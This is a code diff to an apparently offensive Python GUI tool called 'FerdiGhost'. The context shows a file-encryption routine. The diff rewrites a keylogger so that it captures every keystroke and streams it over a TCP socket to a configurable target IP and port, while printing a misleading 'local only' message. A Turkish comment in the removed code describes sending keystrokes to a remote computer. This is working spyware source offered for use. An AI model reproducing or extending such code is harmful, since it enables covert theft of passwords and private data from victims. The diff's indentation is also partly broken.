@@ -121,21 +121,34 @@ class FerdiGhost(QWidget):
             self.output.append(f"[ENCRYPTED] {path}")
 
     # --------------------------
-    # Keylogger (local only)
+    # Keylogger 
     # --------------------------
-  def on_press(key):
+def start_keylogger(self):
+    print("[KEYLOGGER] Started (local only)")
     try:
-        char = key.char
-    except AttributeError:
-        char = f"[{key}]"
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.connect((self.target_ip, self.target_port))
+        
+        def on_press(key):
+            try:
+                char = key.char
+            except AttributeError:
+                char = f"[{key}]"
+            
+            try:
+                self.socket.sendall(char.encode())
+            except Exception as e:
+                print(f"[ERROR] Failed to send data: {e}")
+                return False  # Stop listener on error
 
-    # Local dosyaya yazmak yerine / veya yanında
-    # Uzak sunucuya gönderme
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("hedef_ip", 9999))   # hedef bilgisayarın IP'si ve portu
-    s.sendall(char.encode())
-    s.close()
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
 
+    except Exception as e:
+        print(f"[ERROR] Keylogger failed: {e}")
+    finally:
+        if self.socket:
+            self.socket.close()
 
 # --------------------------
 # Run App
